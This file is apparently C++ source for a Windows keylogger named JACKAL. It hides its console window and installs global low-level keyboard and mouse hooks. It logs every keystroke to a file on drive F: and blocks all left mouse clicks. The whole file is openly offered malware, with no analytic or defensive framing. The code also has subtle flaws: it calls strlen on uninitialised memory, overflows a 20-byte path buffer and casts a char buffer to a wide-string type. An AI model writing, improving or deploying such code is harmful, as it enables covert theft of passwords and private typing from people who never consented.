#define _CRT_SECURE_NO_WARNINGS
#pragma comment (lib,"wininet.lib")
#include <windows.h>
#include <wininet.h> //for uploadFile function
#include <shlobj.h>
#include <iostream>

#define PATH "F:\\"
static int keysPressed = 0; //Count the keys pressed
using namespace std;

FILE* f;
HHOOK hKeyboardHook;

char* toNumber(int number)
{
    char* logName = (char*)malloc(12 * sizeof(char));//7 characters are permanent, 1 is null terminator and 4 for the log number -> total: 12
    snprintf(logName, strlen(logName), "log%d.txt", number);
    return logName;
}

// Variable to store the hook handle
HHOOK miHook;
// This is the hook procedure
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        MSLLHOOKSTRUCT& msll = *(reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)); // In there is more context if you need it
        if (wParam == WM_LBUTTONDOWN) {
            return -1; // This will make the click be ignored
        }
    }
    return CallNextHookEx(miHook, nCode, wParam, lParam); // Important! Otherwise other mouse hooks may misbehave
}

LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
    char currentDirectory[260];
    char workFullPath[20];
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        strcpy(currentDirectory, PATH);
        //Concatenate desktop directory and files
        strcpy(workFullPath, currentDirectory);
        strcat(workFullPath, "\\log.txt");
        if (!(f = fopen(workFullPath, "a+"))) //Open the file
        {
            cout << GetLastError();
            return 1;
        }
        KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
        DWORD dwMsg = 1;
        dwMsg += hooked_key.scanCode << 16;
        dwMsg += hooked_key.flags << 24;
        char lpszKeyName[1024] = { 0 };
        lpszKeyName[0] = '[';
        int i = GetKeyNameText(dwMsg, (LPWSTR)(lpszKeyName + 1), 0xFF) + 1;
        int key = hooked_key.vkCode;
        lpszKeyName[i] = ']';
        //Key value or something else ?
        //if the key if from A-Z,a-z,0-9 then add this to file
        if (key >= 'A' && key <= 'Z')
        {
            if (GetAsyncKeyState(VK_SHIFT) >= 0)//Is CAPS LOCK on?
                key += 0x20;
            if (f != NULL)
                fprintf(f, "%c", key);
        }
        //else add the name of the key.For example if the key is 32 -> Add "Space" to the file,so we know that space has been pressed.lpszKeyName is that name.
        else
        {
            if (f != NULL)
                fprintf(f, "%s", lpszKeyName);
        }
        fclose(f);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI JACKAL(LPVOID lpParm)
{
    // This is how you install the hook
    // And this is how you would remove the hook again
    miHook = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&LowLevelMouseProc),NULL, 0);
    HINSTANCE hins;
    hins = GetModuleHandle(NULL);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(miHook);
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

void main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    JACKAL(NULL);
}
